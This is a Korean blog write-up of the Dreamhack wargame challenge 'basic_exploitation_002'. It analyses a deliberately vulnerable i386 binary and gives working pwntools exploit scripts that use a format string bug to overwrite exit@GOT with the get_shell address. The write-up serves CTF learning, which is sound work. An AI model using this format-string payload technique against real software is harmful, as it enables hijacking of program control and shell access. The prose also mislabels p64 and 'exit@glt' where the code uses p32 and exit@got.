---
title: basic_exploitation_002
description: Dreamhack [Wargame] - basic_exploitation_002
author: juhyeongkim
date: 2024-10-31 3:40:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/4)

## 바이너리 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main(int argc, char *argv[])
{
    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```

<img width="808" alt="image" src="https://github.com/user-attachments/assets/5d3bd9b8-140c-4a07-b68a-1aa517410665">

먼저 보호 기법을 살펴보면, `Paritial RELRO`가 적용되있기 때문에 데이터 섹션에 존재하는 `got` 주소를 조작할 수 있다. 참고로, `Full RELRO`인 경우 데이터 섹션에 쓰기 권한은 남아있지만, `got`의 쓰기 권한은 사라진다.

그리고, `printf(buf);` 를 보면 포맷 스트링을 사용자가 입력할 수 있기 때문에 `FSB` 취약점이 존재한다.

<br>

## 1. GOT Overwrite

이번 바이너리는 `Paritial RELRO`가 적용되어 있기 때문에 `.got` 영역에 **쓰기 권한**이 존재한다. 따라서, `printf(buf);` 를 통해 임의의 주소에 값을 쓸 수 있는데, 이 주소를 `exit` 함수의 `exit.got` 주소로 설정하면 될 것이다.

그리고 `PIE`도 적용되어 있지 않기 때문에 `disass main`이나 아래의 방법을 통해 `exit@plt` 주소를 확인한 후 `exit@got`의 주소를 쉽게 구할 수 있다.

<img width="551" alt="image" src="https://github.com/user-attachments/assets/0d784678-dcad-41ad-9b85-64bd170e7c17">

![image](https://github.com/user-attachments/assets/76141498-fee5-4afc-ab6a-15559dab00aa)

`exit@plt`에서 처음 `jmp` 하는 주소인 `0x804a024`가 `exit@got` 주소가 되고, 사실 `pwntools`의 `elf.got['exit']`로 구해도 된다.

그럼 이제 이 주소를 `buf`를 통해 `[rsp + 0x__]`에 넣어준 후 아래의 `FSB` 취약점을 통해 해당 주소에 바이너리에 존재하는 `get_shell`의 주소를 대입해주면 될 것이다.

<br>

### 참고

**처음에 `0x08048648 <+44>:    call   0x8048470 <exit@plt>` 에서 `exit@got`가 아닌 `exit@plt`가 호출되는 코드 영역의 주소인 `0x08048648`에 `get_shell`의 주소를 대입하려고 했는데 잘 생각해보면 코드 세그먼트에는 쓰기 권한이 존재하지 않으니 안된다.**

**그리고, `exit@plt`도 `got` 테이블에 적힌 함수 주소 값을 가져오기 위한 코드 영역이기 때문에 여기에 쓰는 것도 당연히 안된다.**

**그리고 혹시나 나중에 헷갈릴 수 있는 개념이라 남기면, `%n`으로 값을 쓸 때는 `[rsp + 0x__]`에 저장된 값을 주소로 해석하여 해당 주소가 가리키는 값에 쓰는 거 잘 기억하자. 그래서 `printf`에서도 `%n`는 인자로 `&변수명`으로 쓴다.**

<br>

## Format String Bug

그럼 이제 `exit@got`에 값을 쓰기 위해, `buf`와 `[rsp]`의 주소를 구해보면 아래와 같이 첫번째 인자에 `[rsp]`가 존재하는 것을 알 수 있다. **그리고 이번 바이너리는 `i386`이므로 `4bytes` 씩 주소가 끊기는거 잘 생각하자.**

<img width="872" alt="image" src="https://github.com/user-attachments/assets/6175c0ee-c887-4430-84a6-5b39c77e34da">

그리고 `get_shell`의 주소 또한 `PIE`가 적용되어 있지 않기 때문에 베이스 주소를 구할 필요 없이, `elf.symbols['get_shell']`로 구하거나 `gdb`를 통해 다양한 방법으로 구할 수 있다.

![image](https://github.com/user-attachments/assets/b889b3d6-0400-4ee3-91a7-a3b5d2af7eda)

`get_shell`의 주소가 아래와 같이 `0x8048609` 인데, 이를 정수로 바꿔보면 `134514185`로, `%134514185c`로 입력하기엔 문자열 길이가 너무 길어진다.

따라서, `%n`으로 `i386` 기준 `4bytes` 단위로 입력하면 너무 길어지므로, `%hn`을 통해 `2bytes`로 짤라서 입력하면 `0x0804`, `0x8609`로 입력할 수 있기 때문에 문자열 길이가 훨씬 짧아진다.

<br>

### 참고

- `%n` : `i386` 에서는 주소에 `4bytes` 크기 단위로 입력, `amd64` 에서는 주소에 `8bytes` 크기 단위로 입력

- `%hn` : 아키텍처 상관없이 `2bytes` 크기 단위로 입력

- `%hhn` : 아키텍처 상관없이 `1bytes` 크기 단위로 입력

따라서, 높은 주소부터 해석하기 때문에 `exit@glt + 2` 주소에 `0x0804`를 입력해주고, `exit@glt` 주소에 `0x8609`를 입력해주면 된다. 그럼 `exit@glt`에는 최종적으로 기존대로 `4bytes` 단위로 해석할 때, `0x08048609`를 주소로 읽는다.

그러기 위해서는 `payload`에 `0x0804`와 `0x8609` 중 더 짧은 길이를 먼저 써준 후, 그 길이를 뒤에 쓸 길이에서 빼준만큼 뒤에 써주면 된다. 왜냐하면 `%hn`을 두 번 쓰면 뒤의 `%hn`은 첫번째 `%hn` 다음에 출력된 문자열의 길이가 아닌 처음부터 출력된 문자열의 길이를 저장하기 때문이다.

따라서, 더 작은 `0x0804 = 2052`를 `%2052c`로 출력해준 후, `0x8609 = 34313`을 `34313 - 2052 = 32261` 으로 계산하여 `%32261c`로 출력해주면 된다.

결론적으로, `%2052c` + `%[n]$hn` + `%32261` + `%[n]$hn` + `p64(exit_got + 2)` + `p64(exit_got)`를 해주면 된다.

포맷스트링 형식자 길이가 `23bytes` 이기 때문에, 중간에 `b"a"`를 하나 추가해서 `24bytes`를 맞춰주면, `p64(exit_got + 2)`는 `[rsp + 24]`인 `7`번째에 존재하고, `p64(exit_got)`는 `8`번째에 존재하게 된다.

따라서, 첫번째 `n`은 `7`으로, 두번째 `n`은 `8`로 설정하여 페이로드를 전달해주면 익스플로잇 성공이다.

<br>

## Exploit

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 10698)
elf = ELF("./basic_exploitation_002")

get_shell = elf.symbols['get_shell']
# get_shell = 0x08048609  # 134514185
exit_got = elf.got['exit']
# exit_got = 0x804a024

# 0x0804 = 2052
# 0x8609 = 34313
payload = b"%2052c%7$hn"        # 0x0804 = 2052 : 길이 11bytes
payload += b"%32261c%8$hn"      # 0x8609 = 34313 (34313 - 2052 = 32261) : 길이 12byte
payload += b"a"                 # 24bytes로 맞추기 위해 1bytes 추가
payload += p32(exit_got + 2)    # 여기까지 28바이트 차지
payload += p32(exit_got)

# payload = b"%34313c%7$hn" # 여기까지 12바이트 차지
# payload += b"%2052c%8$hn" # 여기까지 23바이트 차지
# payload += b"a" # 여기까지 24바이트 차지
# payload += p32(exit_got) # 여기까지 28바이트 차지
# payload += p32(exit_got + 2)

p.send(payload)
p.interactive()
```

<br>

### 참고 `ex2.py` 처럼 코드 섹션을 Overwrite 하려고 하면 쓰기 권한이 없어서 안된다.

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 10698)
elf = ELF("./basic_exploitation_002")

get_shell = elf.symbols['get_shell']
# get_shell = 0x08048609  # 134514185

addr_exit = 0x8048648  # exit 함수가 실행되는 코드 섹션의 주소

# 0x0804 = 2052
# 0x8609 = 34313
payload = b"%2052c%7$hn"        # 0x0804 = 2052 : 길이 11bytes
payload += b"%32261c%8$hn"      # 0x8609 = 34313 (34313 - 2052 = 32261) : 길이 12byte
payload += b"a"                 # 24bytes로 맞추기 위해 1bytes 추가
payload += p32(addr_exit + 2)   # 여기까지 28바이트 차지
payload += p32(addr_exit)

p.send(payload)
p.interactive()
```